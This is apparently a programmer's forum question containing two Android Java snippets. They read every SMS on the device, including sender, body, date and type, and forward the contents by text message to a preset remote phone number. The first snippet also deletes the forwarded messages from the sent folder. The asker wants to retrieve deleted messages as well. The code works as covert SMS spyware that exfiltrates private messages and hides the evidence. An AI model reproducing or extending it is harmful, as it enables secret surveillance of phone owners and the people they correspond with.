<p>I am using this code but this is only fetching undeleted sms that are in inbox <br/> I am fetching according to the sms quatity e.g 2 sms etc <br/> CODE is here <br/></p>  <pre><code>StringBuffer stringBuffer = new StringBuffer();          Uri uri = Uri.parse("content://sms");         Cursor cursor = getContentResolver().query(uri, null, null, null, null);          if (cursor.toString().isEmpty()) {             msgSending("Sorry No Such Data Found", gs.PhoneNumber);             SmsReceiving.deleteSentSMS(getApplicationContext(),                     gs.PhoneNumber);         } else {         if (cursor.moveToFirst()) {             for (int i = 0; i &lt; gs.SmsAmount; i++) {                 String body = cursor.getString(                         cursor.getColumnIndexOrThrow("body")).toString();                 String number = cursor.getString(                         cursor.getColumnIndexOrThrow("address")).toString();                 String date = cursor.getString(                         cursor.getColumnIndexOrThrow("date")).toString();                 Date smsDayTime = new Date(Long.valueOf(date));                 String type = cursor.getString(                         cursor.getColumnIndexOrThrow("type")).toString();                 String typeOfSMS = null;                 switch (Integer.parseInt(type)) {                 case 1:                     typeOfSMS = "INBOX";                     break;                  case 2:                     typeOfSMS = "SENT";                     break;                  case 3:                     typeOfSMS = "DRAFT";                     break;                 }                  String smsS = "Ph: " + number + "\nMsg Stat: " + typeOfSMS                         + " \nDate: " + smsDayTime + " \nBody: " + body                         +"\n__________________________";                 msgSending(smsS, gs.PhoneNumber);                 cursor.moveToNext();              }              SmsReceiving.deleteSentSMS(SmsReceiverGetSmsLog.this,gs.PhoneNumber);            }         }         cursor.close();     } </code></pre>  <p>but when i fetch datewise sms <br/> then it gives me also deleted sms <br/> but how can i fetch also deleted sms by using first code? <br/> CODE 2 - Datewise <br/></p>  <pre><code>String filter = "date&gt;=" + datestart.getTime() + " and date&lt;="                 + dateend.getTime();         final Uri SMS_INBOX = Uri.parse("content://sms/");         Cursor cursor = getContentResolver().query(SMS_INBOX, null, filter,                 null, null);         String msgData = "";         Integer count;         if (cursor != null) {             try {                 count = cursor.getColumnCount();                 if (count &gt; 0) {                     cursor.moveToFirst();                     do {                         String date = cursor.getString(                                 cursor.getColumnIndexOrThrow("date"))                                 .toString();                         Date smsDayTime = new Date(Long.valueOf(date));                         String type = cursor.getString(                                 cursor.getColumnIndexOrThrow("type"))                                 .toString();                         String typeOfSMS = null;                         switch (Integer.parseInt(type)) {                         case 1:                             typeOfSMS = "INBOX";                             break;                         case 2:                             typeOfSMS = "SENT";                             break;                         case 3:                             typeOfSMS = "DRAFT";                             break;                         }                         sb.append("Address Number:"                                 + "\n"                                 + cursor.getString(                                         cursor.getColumnIndexOrThrow("address"))                                         .toString() + "\n");                         sb.append("Message Body:"                                 + "\n"                                 + cursor.getString(                                         cursor.getColumnIndexOrThrow("body"))                                         .toString() + "\n");                         sb.append("Message DATE:" + "\n" + smsDayTime + "\n");                         sb.append("Message TYPE:" + "\n" + typeOfSMS + "\n");                         sb.append("______________________" + "\n");                     } while (cursor.moveToNext());                 }                  Toast.makeText(getApplicationContext(),                         "Sendind sms::" + GlobalSettings.PhoneNumber,                         Toast.LENGTH_SHORT).show();                 SmsManager smsman = SmsManager.getDefault();                 sms = smsman.divideMessage(sb.toString());                 smsman.sendMultipartTextMessage(GlobalSettings.PhoneNumber,                         null, sms, null, null);                 cursor.close();               } catch (Exception e) {                 // TODO: handle exception                 SmsManager smsManager = SmsManager.getDefault();                 smsManager.sendTextMessage(GlobalSettings.PhoneNumber, null,                         "Inbox is Empty", null, null);             } } </code></pre>